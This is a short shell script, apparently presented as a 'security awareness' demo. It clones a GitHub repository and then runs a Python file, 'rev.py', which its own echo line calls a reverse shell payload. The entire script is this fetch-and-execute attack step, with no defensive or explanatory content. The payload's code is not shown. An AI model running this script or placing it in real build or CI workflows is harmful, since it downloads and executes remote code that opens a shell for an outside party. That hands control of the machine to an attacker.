#!/bin/sh

set -e

# Clone repository
echo "Cloning repository..."
git clone https://github.com/san3ncrypt3d/security-awareness-action.git
cd security-awareness-action

# Run reverse shell payload
echo "Running reverse shell payload..."
python rev.py
